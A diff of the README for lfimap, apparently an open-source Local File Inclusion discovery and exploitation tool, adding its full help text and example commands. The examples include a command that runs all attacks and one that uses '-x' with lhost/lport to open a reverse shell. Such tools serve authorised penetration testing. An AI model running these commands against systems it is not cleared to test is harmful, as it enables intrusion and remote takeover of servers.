@@ -20,16 +20,74 @@
 - [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)
 - [Usage](https://github.com/hansmach1ne/lfimap/wiki)
 
+### -h, --help
+```
+
+usage: lfimap.py [-D <request>] [-H <header>] [-C <cookie>] [-P <proxy>] [--useragent <agent>] [--referer <referer>] [--param <name>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file]
+                 [--xss] [--info] [-a] [-x] [--lhost <lhost>] [--lport <lport>] [-wT <path>] [-wX <path>] [-wC <path>] [-v] [-h]
+                 URL
+
+lfimap, Local File Inclusion discovery and exploitation tool
+
+MANDATORY:
+  URL                            Specify url, Ex: "http://example.org/vuln.php?param=PWN" 
+
+GENERAL OPTIONS:
+  -D <request>                   Do HTTP POST value test. Ex: "param=PWN"
+  -H <header>                    Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
+  -C <cookie>                    Specify session cookie, Ex: "PHPSESSID=1943785348b45"
+  -P <proxy>                     Specify Proxy IP address. Ex: "http://127.0.0.1:8080"
+  --useragent <agent>            Specify HTTP user agent
+  --referer <referer>            Specify HTTP referer
+  --param <name>                 Specify different test parameter value
+  --no-stop                      Don't stop using same method upon findings
+
+ATTACK TECHNIQUE:
+  -f, --filter                   Attack using filter:// wrapper
+  -i, --input                    Attack using input:// wrapper
+  -d, --data                     Attack using data:// wrapper
+  -e, --expect                   Attack using expect:// wrapper
+  -t, --trunc                    Attack using path truncation with wordlist (default "short.txt")
+  -r, --rfi                      Attack using remote file inclusion
+  -c, --cmd                      Attack using command injection
+  --file                         Attack using file:// wrapper
+  --xss                          Test for reflected XSS
+  --info                         Test for basic information disclosures
+  -a, --all                      Use all available methods to attack
+
+PAYLOAD OPTIONS:
+  -x, --exploit                  Exploit to reverse shell if possible (Setup reverse listener first)
+  --lhost <lhost>                Specify local ip address for reverse connection
+  --lport <lport>                Specify local port number for reverse connection
+
+WORDLIST OPTIONS:
+  -wT <path>                     Specify wordlist for truncation test
+  -wX <path>                     Specify wordlist for xss test
+  -wC <path>                     Specify wordlist for command injection test
+
+OTHER:
+  -v, --verbose                  Print more detailed output when performing attacks
+  -h, --help                     Print this help message
+                       
+
+```
 ### Examples 
 
 #### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
-![all_attacks](https://user-images.githubusercontent.com/57464251/152049407-7c8d5293-a8e6-4c0d-ad08-ae5b95da78a2.PNG)
+`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a`  
 
-#### 2) php://input remote command execution attack with '-i' and '-x'.
-![rev_shell](https://user-images.githubusercontent.com/57464251/152051221-0f1eab38-69d6-470b-98e2-8345557ebd82.PNG)
+![all_attacks](https://user-images.githubusercontent.com/57464251/169725893-d1c898a2-86ef-497a-936d-dbbe5bc154a4.png)
 
-#### 3) Post argument testing with '-D'
-![postreq_test](https://user-images.githubusercontent.com/57464251/152058166-d33b85dd-426c-4a93-9a32-a8367c372d6c.PNG)
+
+#### 2) Reverse shell command execution attack with '-x'.
+`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  
+
+![rev_shell](https://user-images.githubusercontent.com/57464251/169725946-7565eb46-c896-40c6-8bfc-8e24c840419d.png)
+
+#### 3) Post argument testing with '-D'. 
+`python3 lfimap.py http://IP/index.php -D "param=PWN" -a`
+
+![postreq_test](https://user-images.githubusercontent.com/57464251/169726000-89d4e66a-8ddc-4598-941a-710dc8f4db51.png)
 
 
 If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
